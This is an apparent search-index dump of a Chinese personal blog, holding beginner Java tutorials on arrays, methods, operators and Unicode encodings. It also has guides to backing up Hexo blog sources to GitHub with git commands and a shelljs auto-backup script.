&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个数组的内存图","slug":"java00012一个数组的内存图","date":"2020-02-07T18:51:11.000Z","updated":"2020-02-07T18:55:45.444Z","comments":true,"path":"2020/02/08/java00012一个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00012一个数组的内存图/","excerpt":"","text":"12345678910111213public class test011 &#123; public static void main(String[] args) &#123; int[] array = new int[3];//从堆区创建一个包含三个元素的数组 System.out.println(array); array[1] = 2; //从堆区把array[1]的值修改成2 array[2] = 200;//从堆区把array[2]的值修改成100 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java中的内存划分","slug":"java00011Java中的内存划分","date":"2020-02-07T15:10:32.000Z","updated":"2020-02-07T15:42:07.946Z","comments":true,"path":"2020/02/07/java00011Java中的内存划分/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/07/java00011Java中的内存划分/","excerpt":"","text":"Java的内存需要划分成为5个部分 1.栈（Stack）: 存放的都是方法中的局部变量。方法的运行一定要在栈当中运行。 局部变量：方法的参数，或者是方法{}内部的变量 作用域：一但超出作用域，立刻从栈内存中消失。 2.堆（Heap）：凡是new出来的内存，都在堆区中。 堆内存里面的内存都有一个内存地址值：16进制 堆内存里面的数据，都有默认值。规则： 如果是整数 默认值为0 如果是浮点数 默认值为0.0 如果是字符 默认值为‘\\u0000’ 如果是布尔 默认值为false 如果是引用类型 默认值为null 3.方法区（Method Area）：存储.class相关的信息，包含方法的信息 4.本地方法栈（Native Method Stack）：与操作系统相关。 5.寄存器（PC Register）：与CPU相关。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组","slug":"java00010数组","date":"2020-02-05T21:39:02.000Z","updated":"2023-09-24T16:55:12.698Z","comments":true,"path":"2020/02/06/java00010数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00010数组/","excerpt":"","text":"数组 数组的概念 ​ 数组是引用数据类型 ​ 类型要统一 ​ 数组的长度在运行期间不可以改变 初始化 动态初始化（指定长度） ​ 数据类型[] 数组名称 = new 数据类型[数组长度] ​ 使用动态初始化数组的时候,其中的元素将会自动拥有一个默认值.规则如下: 如果是整数类型,那么默认值为0; 如果是浮点类型,那么默认值为0.0; 如果是字符类型,那么默认值为’\\u0000’ u代表Unicode ,0000代表十六进制数; 如果是布尔类型,那么默认值为false; 如果是引用类型,那么默认值为null(空常量); 注意事项： 静态初始化没有直接指定长度，但是仍然会自动推算得到长度。 静态初始化标准格式可以拆分成为两个步骤。 动态初始化也可以拆分成为两个步骤。 静态初始化一旦使用省略格式，就不能拆分成为两个步骤了。 使用建议： 如果不确定数组当中的具体内容，用动态初始化；否则，已经确定了具体的内容，用静态初始化。 注意事项 静态初始化其实也有默认值的过程,只不过系统自动马上将默认值替换成为了大括号当中的具体数值. 123456789101112131415class test010 &#123; public static void main(String[] args) &#123; int[] arr1 = new int[10]; int[] arr2 = new int[]&#123;1,2,3,4&#125;; System.out.println(arr1[0]);//默认值为0; System.out.println(arr1[1]);//默认值为0; System.out.println(arr1[2]);//默认值为0; /*数组赋值*/ arr1[1] = 100; System.out.println(arr1[1]); &#125;&#125; 拆分格式 数据类型[] 数组名; 数组名 = new 数据类型名[]{元素1,元素2,…} 数组名 = new 数据类型名[长度]; 123456789public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;10,2,3,4&#125;; //arr = new int[10]; &#125;&#125; 静态初始化(指定内容) ​ 数据类型[] 数组名 = new 数据类型[] {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = new int[]&#123;1,2,3,4&#125;; &#125;&#125; 省略格式 ​ 数据类型[] 数组名 = {元素1,元素2,…,元素n}; 静态初始化不能使用省略格式 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = &#123;1,2,3,4&#125;; &#125;&#125; 拆分格式 ​ 不能再用省略格式 ​ 数据类型[] 数组名; ​ 数组名 = new 数据类型名[]{元素1,元素2,…} 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; &#125;&#125; 访问数组元素 ​ 直接打印数组名,会打印数组内存地址哈希值 ​ 格式 : 数组名[索引值] ​ 索引值从0开始到数组长度-1结束 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; System.out.println(arr);//打印数组内存地址哈希值 System.out.println(arr[0]);//使用数组下标访问数组元素 for(int i = 0; i &lt; arr.length;i++)//数组下标不大于数组的长度 &#123; System.out.println(arr[i]); &#125; &#125;&#125; 二维数组 1234int [][] arr = new int [][]=&#123;&#123;1,3,4&#125;,&#123;1,2,3&#125;&#125;;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"方法定义和使用","slug":"java00009方法定义和使用","date":"2020-02-05T21:13:51.000Z","updated":"2020-02-05T21:34:04.363Z","comments":true,"path":"2020/02/06/java00009方法定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00009方法定义和使用/","excerpt":"","text":"方法 方法定义 ​ 以public static开头 ​ public static 类型 方法名() ​ { ​ } 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 方法的三种调用格式 单独调用 ​ 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; funName(20); System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 打印调用 ​ System.out.println(方法名（[参数]）) 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println( funName(20) ); &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 赋值调用 ​ int a = 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; int a = funName(20);//赋值调用 &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 方法分为两种 参数 ​ 有参数 ​ 无参数 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有参数方法定义 &#123; return a + 10; &#125; public static int funName() //无参数方法定义 &#123; return 10; &#125;&#125; 返回值 ​ 有返回值 ​ 无返回值 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有返回值方法定义 &#123; return a + 10; &#125; public static void funName() //无返回值方法定义 &#123; return ; &#125;&#125; 方法注意事项 方法应该定义类中，不能定义在方法中 方法定义没有前后顺序 方法定义之后不会自动执行，需要手动调用 如果方法有返回值，必须写上 return 返回值 返回的数据必须要和返回值类型一致 对于void返回值类型，可以只写return； 一个方法可以有多个return，但只能执行其中一个 方法重载Overload 如果功能相同，参数不同，可以使用方法重载 特征 ​ 方法名要相同 ​ 参数个数不同 ​ 参数类型不同 ​ 类型名 参数顺序不同 12345678910111213141516171819202122232425public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) &#123; return a + 10; &#125; public static int funName() //参数个数不同 &#123; return 10; &#125; public static int funName(int a,int b) //参数个数不同 &#123; return a + b; &#125; public static int funName(double a,int b) //参数类型不同 &#123; return (int)a + b; &#125; public static int funName(int a,double b) //参数顺序不同 &#123; return a + (int)b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集成开发环境","slug":"java00008集成开发环境","date":"2020-02-05T20:49:36.000Z","updated":"2023-09-18T14:21:47.581Z","comments":true,"path":"2020/02/06/java00008集成开发环境/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00008集成开发环境/","excerpt":"","text":"集成开发软件 IntelliJ IDEA ​ 官方网站 www.jetbrains.com ​ 先新建项目,再新建模块,然后新建包,最后新建源文件 ​ 输入psvm 回车 ​ 自动生成public static void main(String[] args) { ​ 会自动保存 快捷键 ​ alt + 4 显示输出框 ​ shift + f10 编译运行 ​ alt + enter 自动修复代码 ​ ctrl + y 删除光标所在行 ​ ctrl + d 复制光标当前行,插入光标位置下面 ​ ctrl+alt + L 格式化代码 ​ ctrl + / 单行注释,再按一次取消单行注释 ​ Ctrl+Shift +/ 多行注释 ​ alt+ins 自动生成代码 get,set,tostring等方法 ​ alt+shift +上下箭头 移动当前代码行 ​ shift + f6 一个改全部改 ​ ctrl + 鼠标左键 转到方法定义处 ​ 设置 ​ 设置字体 ​ file-&gt;settings…-&gt; editor-&gt; Font-&gt;size 设置自动提示快捷键 ​ file-&gt;settings…-&gt;点击齿轮-&gt;Duplicate 复制一份 -&gt;Main menu -&gt; code -&gt; completion -&gt;basic 项目和模块的关闭和导入 关闭 file -&gt; close project 导入 Open -&gt; 选择项目文件 有小黑块的 然后一直下一步 模块 移除 ​ Remove Moudle 导入 ​ File -&gt; Project Structure -&gt; 点击+ -&gt; Import Moudle -&gt;一直选next -&gt;OK","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基本结构","slug":"java00007基本结构","date":"2020-02-05T13:07:02.000Z","updated":"2020-02-05T13:36:13.790Z","comments":true,"path":"2020/02/05/java00007基本结构/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/java00007基本结构/","excerpt":"","text":"顺序结构 ​ 从上到下,顺序执行 选择结构 单if语句 ​ if(条件表达式){语句块} 123456789public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125; &#125;&#125; 标准if else语句 ​ if(条件表达式){语句块;}else{语句块} 1234567891011public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125;else&#123; System.out.println(b); &#125; &#125;&#125; 多层if语句 ​ if(条件表达式){语句块;}else if(条件表达式){语句块}else{语句块} 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11,c =12; if(a &gt; b &amp;&amp; a &gt; c) &#123; System.out.println(a); &#125;else if(b &gt; c &amp;&amp; b &gt; a)&#123; System.out.println(b); &#125;else&#123; System.out.println(c); &#125; &#125;&#125; switch ​ 选择对应于的常量,并执行对应常量的语句 ​ switch(表达式) { ​ case 常量1: ​ 语句; ​ break; ​ case 常量2: ​ 语句; ​ break; ​ default: ​ 语句; } 1234567891011121314151617public class test010 &#123; public static void main(String[] args) &#123; char c = 'A'; switch(c) &#123; case 'A': System.out.println(\"X&gt;=90\"); break; case 'B': System.out.println(\"80&gt;=X&lt;90\"); break; default: System.out.println(\"X&lt;79\"); &#125; &#125;&#125; 常量类型 整型 ​ byte,char,short,int 引用数据类型 ​ String,enum ​ 常量值不能重复 循环结构 for循环语句 for(变量初始化;条件判断;改变变量值) { 语句块; } 12345678public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; System.out.println(i); &#125; &#125;&#125; while循环语句 while(条件) { 语句块; } 12345678910public class test010 &#123; public static void main(String[] args) &#123; int i = 0; while(i &lt; 10) &#123; System.out.println(i); i++; &#125; &#125;&#125; do while循环语句 初始化表达式 do{ ​ 语句块; }while(条件表达式); 123456789public class test010 &#123; public static void main(String[] args) &#123; int i = 0; do&#123; System.out.println(i); &#125;while(i++ &lt; 10); &#125;&#125; break ​ 中止循环 continue ​ 结束本次循环 死循环 ​ java可以有死循环 12345678public class test010 &#123; public static void main(String[] args) &#123; while(1) &#123; //我是死循环 &#125; &#125;&#125; 循环嵌套 ​ 一个循环体嵌套着另一个循环体这就叫做循环嵌套 123456789101112public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; for(int j = 0;j &lt; 10;j++) &#123; System.out.print(\"*\"); &#125; System.out.println(\"\"); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用hexo+GitHub搭建的个人博客 文件备份","slug":"使用hexo-GitHub搭建的个人博客-文件备份","date":"2020-02-05T12:10:54.000Z","updated":"2020-02-05T12:19:28.220Z","comments":true,"path":"2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","excerpt":"","text":"使用hexo+GitHub搭建的个人博客 文件备份 1.在GitHub中创建 hexo 分支来存储本地 markdown 文件 在本地文件根目录创建 .gitignore 文件，若存在修改为 123456.DS_Store*.lognode_modules/.deploy*/public/db.json 在本地文件根目录中初始化 git 1git init 创建分支hexo 1git checkout -b hexo 提交到仓库，需要注意的事在提交之前要把themes目录下主题中的 .git 文件夹重命名或者删除，不然的话 git 会把主题当做子模块来处理。 12git add .git commit -m &apos;init&apos; 添加远程仓库 1git remote add origin git@github.com:MrWangwj/MrWangwj.github.io.git push 到远程分支 1git push origin hexo 2.在另一台电脑上使用 首先要克隆下这个项目 1git clone git@github.com:MrWangwj/MrWangwj.github.io.git 进入博客目录 1cd MrWangwj.github.io.git 切换到博客文件分支 1git checkout -b hexo origin/hexo 安装hexo 1npm install hexo --save 然后编辑、查看 12hexo g //编译hexo s //浏览器查看 localhost:4000 提交 git，若在提交过程中出现 ERROR Deployer not found: git 可执行 npm install hexo-deployer-git --save 后重新提交。 1hexo d 在写了新 markdown 文件后提交 git 123git add .git commit -m &apos;新增博客&apos;git push origin hexo 到此，我们以后只要写完博客发布后记得 push 一下就能实现备份了。","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"自动备份Hexo源文件","slug":"自动备份Hexo源文件","date":"2020-02-05T10:16:47.000Z","updated":"2020-02-05T11:11:10.150Z","comments":true,"path":"2020/02/05/自动备份Hexo源文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/自动备份Hexo源文件/","excerpt":"","text":"自动备份Hexo源文件 前言 配置一个Hexo博客往往需要作者倾注大量心血，而如果哪天电脑坏了或者换电脑导致Hexo源文件丢失的话就是一件比较杯具的事。因此本文给出了一种自动备份Hexo源文件到Github的方法，能够在执行hexo deploy命令后自动执行Git命令以推送Hexo源文件到Github仓库。 原理 NodeJS的事件监听机制能够监听Hexo的事件。通过查询Hexo文档，找到了Hexo的主要事件，见下表： 事件名 描述 deployBefore 在部署完成前发布。 deployAfter 在部署成功后发布。 exit 在Hexo 结束前发布。 generateBefore 在静态文件生成前发布。 generateAfter 在静态文件生成后发布。 new 在文章文件建立后发布。该事件返回文章参数。 processBefore 在处理原始文件前发布。此事件会返回一个地址，代表 Box（Box）的根目录。 processAfter 在原始文件处理后发布。此事件会返回一个地址，代表 Box（Box）的根目录。 ready 在初始化完成后发布。 通过查询上表发现，我们可以通过监听Hexo的deployAfter事件，待部署成功后自动运行Git备份命令，从而达到自动备份的目的。 实现 将Hexo目录加入Git仓库 首先需要在Github创建一个新的repository,名字与本地Hexo文件夹同名即可。然后进入本地Hexo文件夹，按顺序执行以下命令： 123git initgit remote add origin git@github.com:yourname/hexo.gitgit pull origin master 再每次执行hexo generate命令时，public/、.deploy、\\*.log文件夹会重写更新，因此需要在.gitignore文件（如果没有，手动创建一个）中写入public/、.deploy、\\*.log以忽略这几个目录，加快备份的速度。 然后再顺序执行以下命令，将文件推送到Github： 123git add .git commit -m &quot;备份hexo源码文件&quot;git push origin master 这三行命令便是手动推送本地文件到Github的命令,我们接下来要做的是让NodeJS监听到Hexo的deployAfter事件后自动执行上述命令。 安装shelljs模块 键入以下命令即可 1npm install --save shelljs 加入自动执行脚本 在Hexo根目录的scripts文件夹（没有就自己创建一个）下新建一个js文件，文件名随意。然后加入以下代码： 1234567891011121314151617181920212223242526272829303132333435require('shelljs/global');try &#123; hexo.on('deployAfter', function() &#123;//当deploy完成后执行备份 run(); &#125;);&#125; catch (e) &#123; console.log(\"产生了一个错误&lt;(￣3￣)&gt; !，错误详情为：\" + e.toString());&#125;function run() &#123; if (!which('git')) &#123; echo('Sorry, this script requires git'); exit(1); &#125; else &#123; echo(\"======================Auto Backup Begin===========================\"); cd('path to hexo'); //此处修改为Hexo根目录路径 if (exec('git add --all').code !== 0) &#123; echo('Error: Git add failed'); exit(1); &#125; if (exec('git commit -am \"Form auto backup script\\'s commit\"').code !== 0) &#123; echo('Error: Git commit failed'); exit(1); &#125; if (exec('git push origin master').code !== 0) &#123; echo('Error: Git push failed'); exit(1); &#125; echo(\"==================Auto Backup Complete============================\") &#125;&#125; 注意上述代码中第29行需要修改为自己Hexo文件夹的绝对路径。 效果 如果脚本运行成功，会得到类似以下的效果： 1234567891011121314======================Auto Backup Begin===========================cd: no such file or directory: C:/Users/17810/OneDrive/hexowarning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.[master a6cb4c7] Form auto backup script&apos;s commit 1 file changed, 153 insertions(+)warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.To git@github.com:JacobZjw/hexo.git 0beaf4c..a6cb4c7 master -&gt; master==================Auto Backup Complete============================ 懒癌患者的小福利 在hexo中，我们常常使用hexo new命令来新建文章。然鹅，当我们的文章较多时，我们往往需要在成堆的文章中找到刚刚生成的文件，然后使用Markdown编辑器打开。作为一名懒癌患者怎么可能让自己如此受累。 于是，我找到了Hexo作者给出的解决办法 和上面类似，在scripts文件夹中创建一个js文件，添加以下代码： 1234567891011var spawn = require('child_process').exec;// Hexo 2.x 用户复制这段hexo.on('new', function(path)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + path);&#125;);// Hexo 3 用户复制这段hexo.on('new', function(data)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + data.path);&#125;); 保存并退出脚本之后，在命令行中键入： 1hexo new &quot;auto open editor test&quot; 是不是就顺利的自动打开了自动生成的md文件啦~","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"JDK9的JShell-编译器的两点优化","slug":"java00006JDK9的JShell-编译器的两点优化","date":"2020-02-04T00:17:40.000Z","updated":"2023-09-10T14:37:49.310Z","comments":true,"path":"2020/02/04/java00006JDK9的JShell-编译器的两点优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00006JDK9的JShell-编译器的两点优化/","excerpt":"","text":"JDK9的JShell 什么时候会用到 JShell 工具呢，当我们编写的代码非常少的时候，而又不愿意编写类，main方法，也不愿意去编译和运 行，这个时候可以使用JShell工具。 启动JShell工具，在DOS命令行直接输入JShell命令。 打开cmd ​ 输入jshell ​ 退出/exit 编译器的两点优化 byte,short,char类型右侧没有超过本身范围,会自动强制转换类型 如果超过左侧范围,编译器会报错 ​ byte a = 12 ​ 常量优化 ​ 1 + 1常量表达式 在编译时会计算结果,而不是在运行时计算 12345public class test010 &#123; public static void main(String[] args) &#123; byte a = 12 //隐式的把12从int类型转换为byte类型 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java方法","slug":"java00005方法","date":"2020-02-04T00:02:04.000Z","updated":"2020-02-04T00:15:05.122Z","comments":true,"path":"2020/02/04/java00005方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00005方法/","excerpt":"","text":"方法 定义 ​ public static void 方法名称(){语句块} ​ 方法的定义是无序性的 ​ 不能嵌套定义方法 命名方法 ​ 小驼峰式法 方法调用 格式 ​ 方法名称(); 12345678910111213public class test009 &#123; public static void main(String[] args) &#123; System.out.println(intAdd(10,20));//方法调用 &#125; //方法定义 public static int intAdd(int a,int b) &#123; return a + b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java运算符","slug":"java00004java运算符","date":"2020-02-03T23:09:34.000Z","updated":"2023-09-10T14:17:53.542Z","comments":true,"path":"2020/02/04/java00004java运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00004java运算符/","excerpt":"","text":"运算符 基本运算符 + - * / % 自增自减 – ++ 复合运算符 += -= *= /= %= 默认会强制类型转换 类型不同运算时,返回的结果为较大范围的类型 123456789101112131415161718192021222324public class test007 &#123; public static void main(String[] args) &#123; int a = 10,b = 20,c = 0; c = a + b; System.out.println(c); c = a - b; System.out.println(c); c = a * b; System.out.println(c); c = a / b; System.out.println(c); c = a % b; System.out.println(c); c += a / a; // c = c + (a / a) System.out.println(c); &#125;&#125; String 字符串类型 String 变量名 任何数据类型和字符串类型进行连接的时候,都会变成字符串 字符串 + 字符串 = 拼接字符串 12345678public class test008 &#123; public static void main(String[] args) &#123; String str = \"abc\"; System.out.println(str + \"efg\"); &#125;&#125; 比较运算符 &gt; 大于 &lt; 小于 = 等于 &lt;= 小于等于 &gt;= 等于等于 == 等于 != 不等于 运算结果都是布尔值 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99; isTrue = a &gt; b; System.out.println(isTrue); &#125;&#125; 逻辑运算符 &amp;&amp;(与),||(或),!(非) &amp;&amp; 两个条件为真,结果才为真 || 只要有一个条件为真,结果就为真 ! 真就是假,假就是真 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99,c = 101; isTrue = a &gt; b &amp;&amp; a &lt; c; System.out.println(isTrue); &#125;&#125; 三元运算符 变量名 = 条件判断 ? 表达式A :表达式B ​ 条件为真返回表达式A,否则返回表达式B ​ 两个表达式类型要和变量类型一致 ​ 运算结果必须被使用 123456789public class test008 &#123; public static void main(String[] args) &#123; int a = 100,b = 99,c; c = (a &gt; b)? a : b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ASCII码-Unicode码","slug":"java00003ASCII码-Unicode码","date":"2020-02-03T22:26:00.000Z","updated":"2020-02-03T23:07:54.372Z","comments":true,"path":"2020/02/04/java00003ASCII码-Unicode码/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00003ASCII码-Unicode码/","excerpt":"","text":"ASCII码 从0到255都是ASCLL码 美国信息交换标准代码(American Standard Code For Information Interchange) Unicode Unicode 编码包含 ASCII 前面127的完全一样 称为万国码 Unicode（统一码、万国码、单一码）于1990年开始研发，1994年正式公布，是计算机领域里一项业界标准，包括字符集，编码方案等。Unicode是为了解决传统字符编码方案的局限而产生的，为每种语言中的每个字符都设定了统一唯一的二进制编码，以实现跨语言、跨平台进行文本转换、处理的要求。 计算机在设计时采用8个比特(bit)作为一个字节(byte)，所以一个字节最多能表示256个字符，早期对于使用英文的西方国家来说，一个字节可以存储大小写英文字母、数学和一些符号，因此使用一个字节来制作码表（ASCII）。后来计算机传到了其他的国家，很多国家都是使用自己的语言，比如中文、日文、韩文…语言复杂了，为了解决这个问题，每个国家制定自己的码表，中国在1980年便制定了GB2312汉字编码字符集，汉字比英文多很多，一个字节明显不够用，所有就使用2个字节来编码。然而不同国家所定义的字符编码虽然可以使用，但是在不同的国家间却经常出现不兼容的情况。如果电脑想处理多语言环境（使用中文或其他语言）可能存在无法同时支持多语言环境。 为了统一所有文字的编码，产生了Unicode,把所有语言的都统一到一套编码里，这样就不会乱码了。 在表示Unicode字符时，通常会用U+然后紧跟一组16进制的数字表示一个字符，在基本多文种平面（第零平面）Basic MultilingualPlane（BMP）里所有的字符都使用4位16进制表示。编码从U+0000到U+FFFF,共支持6万多个字符，在BMP以外的字符则需要使用5位或者6位16进制来表示。 目前Unicode字符分为17组编排，0x0000至0x10FFFF,每组称为平面（Plane）,每个面拥有65536个码位，共1114112个。 Unicode就像一张表，包所有的字符都编写到表中，每一个字符对应一个数字，称为码点（code point）,这个数字一般不直接使用，通过不同的编码方式来使用。 UTF-8、UTF-16、UTF-32就是将数字转换到程序数据的编码方案。UTF是“UnicodeTransformation Format”的缩写，可以翻译成Unicode字符集转换格式，即怎样将Unicode定义的数字转换成程序数据。 UTF-8 UTF-8是以字节位单位对Unicode编码，第0-127位字符使用1个字节来表示，和ASCII编码相同，从128号开始的字符使用2、3、4位字节来表，UTF-8又被称为可变长编码。 UTF-8编码中，使用的是变成的字节序列表示字符，字符对应的代码点（code point）可能使用的是1-4个字节，这样一个字节就是一个代码单元。一个代码点（code point）可能由1-4个代码单元（code unit）组成。 十进制 Unicode编码 UTF-8字节流 0-127位 0x000000-0x00007F 0xxxxxxx(7位) 128-2047位 0x000080-0x0007FF 110xxxxx 10xxxxxx（11位） 2048-65535位 0x000800-0x00FFFF 1110xxxx 10xxxxxx 10xxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx(21位) 比如：“汉”在Unicode中的编码为0x6C49,在表格中的第三行，使用模板为：1110xxxx 10xxxxxx10xxxxxx。将0x6C49转换成二进制：0110 1100 0100 1001，将模板中的x依次替换11100110 10110001 10001001，即E6 B1 89。 UTF-16 UTF-16也是可变长度编码，使用2个或者4个字节来存储字符，但是会浪费存储空间。 UTF-16编码中，字符对应的代码点（code point）可能使用的是2或4个字节，因此2个字节就是一个代码单元（code unit）,一个代码点（codepoint）可由1个或者2个代码单元（code unit）组成。 十进制 Unicode编码 UTF-16字节流 0-65535位 0x000000-0x00FFFF xxxxxxxx xxxxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 110110yy yyyyyyyy 110111xx xxxxxxxx(20位) 平面0有一个专用区：0xE000-0xF8FF，有6400个码位。平面0的0xD800-0xDFFF，共2048个码位，是一个被称作代理区（Surrogate）的特殊区域。代理区的目的用两个UTF-16字符表示BMP以外的字符。所有大于0x00FFFF的码需要使用代理区的码点。 为了将一个16位无符号整数的UTF-16编码与二个16位无符号整数的UTF-16编码区分开来，Unicode编码的设计者将0xD800-0xDFFF保留下来，并称为代理区（Surrogate）： 十进制 Unicode编码 说明 说明 55296-56191 0xD800－0xDB7F（896个） High Surrogates 高位替代 56192-56913 0xDB80－0xDBFF（128个） High Private Use Surrogates 高位专用替代 56320-57343 0xDC00－0xDFFF（1024个） Low Surrogates 低位替代 增补的16个平面（第2平面-第17平面），范围为：0x010000-0x10FFFF，需要使用2个代理码元表示，第一个码元为0xD800-0xDBFF(高位)范围是:11011000 00000000到11011011 11111111，第二个码元为0xDC00－0xDFFF（低位）范围是：11011100 00000000到11011111 11111111。 目前Unicode最大的码位是0x10FFFF，减去0x010000后最大值为0xFFFFF，完全可以用20位来表示。 把Unicode编码记作U，如果U≥0x10000，我们先计算U’=U-0x10000，然后将U’写成二进制形式：yyyy yyyy yyxx xxxx xxxx，U的UTF-16编码（二进制）就是：110110yyyyyyyyyy110111xxxxxxxxxx 比如：Unicode编码0x20C30，减去0x10000后，得到0x10C30，写成二进制是：0001 0000 1100 0011 0000。用前10位依次替代模板中的y，用后10位依次替代模板中的x，就得到： 1101100001000011 1101110000110000，即0xD8430xDC30。 UTF-32 UTF-32编码以32位无符号整数为单位。Unicode的UTF-32编码就是其对应的32位无符号整数。 UTF-32编码，一个代码点对应4个字节，因此4个字节就是一个代码单元（codeunit）。 十进制 Unicode编码 UTF-32字节流 0-111411位 0x000000-0x10FFFF xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (32位) 比如：编码0x6C49使用UTF-32编码其结果为：0x00006C49。 字节序 字节序有两种，分别是大端（Big Endian, BE）和小段（Little Endian, LE）。根据字节序的不同，UTF-16实现为UTF-16BE和UTF-16LE，UTF-32实现为UTF-32BE和UTF-32LE。 根据字节序的不同，UTF-16可被实现为UTF-16LE或UTF-16BE，UTF-32可被实现为UTF-32LE或UTF-32BE。 Unicode编码 UTF-16LE UTF-16BE UTF32-LE UTF32-BE 0x006C49 49 6C 6C 49 49 6C 00 00 00 00 6C 49 0x020C30 43 D8 30 DC D8 43 DC 30 30 0C 02 00 00 02 0C 30 Unicode标准建议用BOM（Byte Order Mark）来区分字节序，即在传输字节流前，先传输被作为BOM的字符“零宽无中断空格”。这个字符的编码是FEFF，而反过来的FFFE（UTF-16）和FFFE0000（UTF-32）在Unicode中都是未定义的码位，不应该出现在实际传输中。 UTF编码的BOM： UTF编码 Byte Order Mark (BOM) UTF-8 without BOM 无 UTF-8 with BOM EF BB BF UTF-16LE FF FE UTF-16BE FE FF UTF-32LE FF FE 00 00 UTF-32BE 00 00 FE FF","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"IntelliJ IDEA 中自定义模板代码的缩写","slug":"java00000IntelliJ-IDEA-中自定义模板代码的缩写","date":"2020-02-03T21:58:59.000Z","updated":"2020-02-03T22:10:30.936Z","comments":true,"path":"2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00000IntelliJ-IDEA-中自定义模板代码的缩写/","excerpt":"","text":"IntelliJ IDEA 中自定义模板代码的缩写 方法一：新建 Live Template step1. 点击 File – Setting step2. 选择 Live Template，点击右侧的+号，选择 Template Group step3. 输入自定义的名称，然后点击OK。 step4. 选中刚创建的 Template Group，再次点击右侧的+号，选择Live Template step5. 填入缩写词、描述、模版内容、生效文件范围等 配置模板时，变量名以$ $包围的字符的形式出现,调用的方法也是先以变量形式出现，写完模板信息后去编辑变量(Edit variables)。 